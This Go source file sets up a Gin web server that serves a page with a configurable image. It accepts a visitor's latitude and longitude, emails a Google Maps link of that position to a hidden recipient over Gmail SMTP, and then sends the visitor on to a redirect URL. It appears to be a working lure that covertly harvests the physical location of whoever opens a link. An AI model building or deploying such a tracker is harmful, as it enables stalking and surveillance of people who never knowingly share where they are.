package main

import (
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	gomail "gopkg.in/mail.v2"
)

type Location struct {
	Latitude  float64 `json:"latitude"`
	Longitude float64 `json:"longitude"`
}

func main() {
	server := gin.Default()

	server.Use(cors.Default())
	
	server.LoadHTMLFiles("main.html")

	server.GET("/", func(c *gin.Context) {
        c.HTML(200, "main.html", gin.H{
            "ImageURL": os.Getenv("IMG_URL"),
        })
    })

	server.POST("/", func(c *gin.Context) {
		var loc Location
		url := os.Getenv("REDIRECT_URL")

		if err := c.ShouldBindJSON(&loc); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		mapsLocation := fmt.Sprintf("https://www.google.com/maps/place/%f+%f", loc.Latitude, loc.Longitude)

		log.Printf("Recebido: Latitude %f, Longitude %f\n", loc.Latitude, loc.Longitude)
		log.Printf("Maps: %s", mapsLocation)

		err := SendByEmail(mapsLocation)
		if err != nil {
			log.Printf("err %s", err.Error())
			return
		}

		c.JSON(http.StatusOK, gin.H{"url": url})
	})

	if err := server.Run(":8080"); err != nil {
		log.Fatal(err)
	}
}

func SendByEmail(loc string) error {
	log.Printf("%-12s Enviando notificação via e-mail", "[EMAIL]")
	mail := gomail.NewMessage()

	email := os.Getenv("MY_EMAIL")
	password := os.Getenv("MY_SECRET")
	
	mail.SetHeader("From", email)
	mail.SetHeader("To", os.Getenv("MY_RECEIVED_EMAIL"))
	mail.SetHeader("Subject", "Location")

	mail.SetHeader("Content-Type", "text/plain")

	mail.SetBody("text/plain", loc)
	

	dialer := gomail.NewDialer("smtp.gmail.com", 587, email, password)
	if err := dialer.DialAndSend(mail); err != nil {
		log.Printf("%-12s Erro ao enviar notificação: %s", "[EMAIL]", err)
		return errors.New("error sending notification")
	}
	
	return nil
}